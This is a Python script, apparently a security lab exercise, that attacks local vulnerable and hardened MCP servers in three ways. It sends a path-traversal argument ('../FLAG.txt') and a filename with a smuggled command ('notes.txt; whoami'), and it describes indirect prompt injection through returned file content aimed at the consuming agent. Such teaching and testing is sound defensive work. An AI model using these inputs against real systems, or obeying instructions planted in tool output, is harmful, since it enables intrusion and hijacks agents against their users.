#!/usr/bin/env python
"""attack_demo.py — Round A. Fire the three attacks at a CTF server over the real MCP loop.

For each flag jot one line: "worked / didn't, because ___" — that sentence is the gate.

Usage:
    python attack_demo.py             # attack the VULNERABLE server (flags 1 & 2 land)
    python attack_demo.py hardened    # attack the HARDENED server (flags 1 & 2 fail)
"""
import asyncio
import os
import sys

from mcp import ClientSession, StdioServerParameters
from mcp.client.stdio import stdio_client

HERE = os.path.dirname(os.path.abspath(__file__))


def _text(result) -> str:
    return "\n".join(
        c.text for c in result.content if getattr(c, "type", None) == "text"
    )


def _first_line(s: str) -> str:
    return (s.strip().splitlines() or [""])[0]


def _indent(s: str, n: int = 6) -> str:
    pad = " " * n
    return pad + s.strip().replace("\n", "\n" + pad)


def _ran_standalone(output: str, token: str) -> bool:
    """True only if `token` is a line of its OWN — i.e. a command actually produced it.
    Guards against the false positive where the username merely appears inside an echoed
    path like /Users/<user>/... in a 'No such file' error from the hardened server."""
    return bool(token) and any(line.strip() == token for line in output.splitlines())


async def call(session, name, args):
    r = await session.call_tool(name, args)
    return r.isError, _text(r)


async def main(target: str) -> None:
    server_file = (
        "ctf_server_hardened.py" if target == "hardened" else "ctf_server_vulnerable.py"
    )
    me = os.popen("whoami").read().strip()
    print(f"\n{'='*64}\n  Round A — attacking {server_file}\n{'='*64}")

    params = StdioServerParameters(command=sys.executable, args=[server_file], cwd=HERE)
    async with stdio_client(params) as (read, write):
        async with ClientSession(read, write) as session:
            await session.initialize()

            # 🚩 FLAG 1 — path traversal
            print("\n🚩 FLAG 1 — path traversal:  read_workspace_file('../FLAG.txt')")
            err, txt = await call(
                session, "read_workspace_file", {"path": "../FLAG.txt"}
            )
            if err:
                print(f"   DEFENDED — server refused: {_first_line(txt)}")
            else:
                print(
                    f"   LEAKED   — got a file outside the workspace: {_first_line(txt)}"
                )

            # 🚩 FLAG 2 — command injection
            print("\n🚩 FLAG 2 — command injection:  count_lines('notes.txt; whoami')")
            err, txt = await call(
                session, "count_lines", {"filename": "notes.txt; whoami"}
            )
            print(_indent(txt))
            if _ran_standalone(txt, me):
                print(f"   PWNED    — injected `whoami` executed -> {me}")
            else:
                print("   DEFENDED — no shell to inject into; `whoami` never ran")

            # 🚩 FLAG 3 — indirect prompt injection (hostile OUTPUT, not server-fixable)
            print(
                "\n🚩 FLAG 3 — indirect prompt injection:  read_workspace_file('meeting_notes.txt')"
            )
            err, txt = await call(
                session, "read_workspace_file", {"path": "meeting_notes.txt"}
            )
            print(_indent(txt))
            print(
                "   NOTE — the server faithfully returned hostile CONTENT either way."
            )
            print(
                "          Whether the ATTACK succeeds depends on the consuming AGENT obeying it."
            )
            print(
                "          That is why no server patch can fully close flag 3 (it's a WS4 problem)."
            )

    print(f"\n{'='*64}\n  done.\n{'='*64}\n")


if __name__ == "__main__":
    asyncio.run(main(sys.argv[1] if len(sys.argv) > 1 else "vulnerable"))
